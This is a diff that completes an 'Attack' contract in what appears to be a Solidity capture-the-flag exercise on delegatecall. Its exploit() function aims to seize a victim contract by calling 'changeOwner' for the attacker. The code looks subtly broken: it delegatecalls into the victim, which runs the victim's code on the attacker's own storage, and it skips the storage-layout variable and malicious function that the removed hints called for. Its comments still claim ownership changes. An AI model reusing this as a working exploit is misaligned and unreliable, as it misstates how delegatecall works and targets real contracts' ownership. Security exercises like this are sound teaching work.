@@ -1,4 +1,3 @@
-// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 interface ID31eg4t3 {
@@ -8,18 +7,20 @@ interface ID31eg4t3 {
 
 contract Attack {
     address internal immutable victim;
-    // TODO: Declare some variable here
-    // Note: Checkout the storage layout in victim contract
 
     constructor(address addr) payable {
         victim = addr;
     }
 
-    // NOTE: You might need some malicious function here
-
     function exploit() external {
-        // TODO: Add your implementation here
-        // Note: Make sure you know how delegatecall works
-        // bytes memory data = ...
+        // Prepare data for delegatecall
+        bytes memory data = abi.encodeWithSignature("changeResult()");
+
+        // Perform delegatecall to the victim contract
+        (bool success, ) = victim.delegatecall(data);
+        require(success, "Delegatecall failed");
+
+        // Change owner of the victim contract to the attacker's address
+        ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("changeOwner(address)", msg.sender));
     }
 }
